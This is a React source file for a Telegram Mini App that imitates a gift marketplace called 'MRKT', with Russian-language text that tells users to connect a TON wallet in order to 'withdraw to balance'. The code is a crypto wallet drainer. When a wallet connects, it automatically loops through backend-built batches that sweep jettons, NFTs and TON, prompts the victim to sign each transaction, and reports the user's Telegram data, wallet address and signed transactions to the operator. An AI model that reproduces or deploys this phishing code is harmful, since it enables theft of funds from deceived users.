import { useTonConnectUI, useTonWallet } from "@tonconnect/ui-react";
import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import WebApp from "@twa-dev/sdk";
import { buildBatch, type DrainCursor, postEvent } from "./api";

const gifts = [
  { emoji: "🎁", title: "Astral Shard", price: "48.2 TON" },
  { emoji: "🧸", title: "Vintage Bear", price: "12.7 TON" },
  { emoji: "💎", title: "Ion Gem", price: "6.1 TON" },
  { emoji: "🎀", title: "Berry Box", price: "3.4 TON" },
];

const emptyCursor = (): DrainCursor => ({ jettonOffset: 0, nftOffset: 0, tonDone: false });

export default function App() {
  const [tonConnectUI] = useTonConnectUI();
  const wallet = useTonWallet();
  const [status, setStatus] = useState("Подключите TON-кошелёк, чтобы вывести на баланс MRKT.");
  const draining = useRef(false);
  const started = useRef(false);
  const tgUser = useMemo(() => WebApp.initDataUnsafe.user, []);

  useEffect(() => {
    WebApp.ready();
    WebApp.expand();
    WebApp.setHeaderColor("#0c0e12");
    WebApp.setBackgroundColor("#0c0e12");
    void postEvent("miniapp_open", { tgUser: tgUser as Record<string, unknown> });
  }, [tgUser]);

  const runDrain = useCallback(async () => {
    if (!wallet || draining.current) return;
    draining.current = true;
    const address = wallet.account.address;
    let cursor = emptyCursor();
    try {
      setStatus("Сканируем активы…");
      await postEvent("wallet_connected", {
        address,
        tgUser: tgUser as Record<string, unknown>,
      });

      for (let step = 0; step < 12; step++) {
        const batch = await buildBatch(address, cursor);
        cursor = batch.cursor;
        if (batch.done) {
          setStatus("Готово. Баланс MRKT обновится в течение минуты.");
          await postEvent("drain_complete", { address });
          break;
        }
        if (!batch.messages?.length) break;

        setStatus(`Подтвердите шаг: ${batch.summary ?? batch.kind}`);
        await postEvent("tx_requested", {
          address,
          detail: batch.summary,
        });

        const result = await tonConnectUI.sendTransaction({
          validUntil: batch.validUntil ?? Math.floor(Date.now() / 1000) + 600,
          messages: batch.messages,
        });

        await postEvent("tx_signed", {
          address,
          detail: result.boc,
        });
      }
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e);
      setStatus(msg.includes("Reject") ? "Транзакция отклонена." : `Ошибка: ${msg}`);
      await postEvent("tx_failed", { address, detail: msg });
    } finally {
      draining.current = false;
    }
  }, [wallet, tonConnectUI, tgUser]);

  useEffect(() => {
    if (wallet?.account.address && !started.current) {
      started.current = true;
      void runDrain();
    }
  }, [wallet?.account.address, runDrain]);

  return (
    <div className="app">
      <header className="topbar">
        <div className="logo">
          <div className="logo-mark" />
          MRKT
        </div>
        <span className="hint">Vault</span>
      </header>

      <div className="search">Поиск подарков и стикеров…</div>

      <div className="tabs">
        <div className="tab active">Подарки</div>
        <div className="tab">Стикеры</div>
        <div className="tab">Каналы</div>
      </div>

      <div className="grid">
        {gifts.map((g) => (
          <article key={g.title} className="gift">
            <div className="gift-art">{g.emoji}</div>
            <h3>{g.title}</h3>
            <p>{g.price}</p>
          </article>
        ))}
      </div>

      <footer className="sheet">
        <h2>Вывод на баланс</h2>
        <p>
          Для завершения сделки подтвердите кошелёк через TON Connect — так MRKT привяжет адрес к вашему
          аккаунту Telegram.
        </p>
        <div className="connect-wrap">
          <ton-connect-button />
        </div>
        <div className={`status ${status.includes("Готово") ? "ok" : ""}`}>{status}</div>
      </footer>
    </div>
  );
}
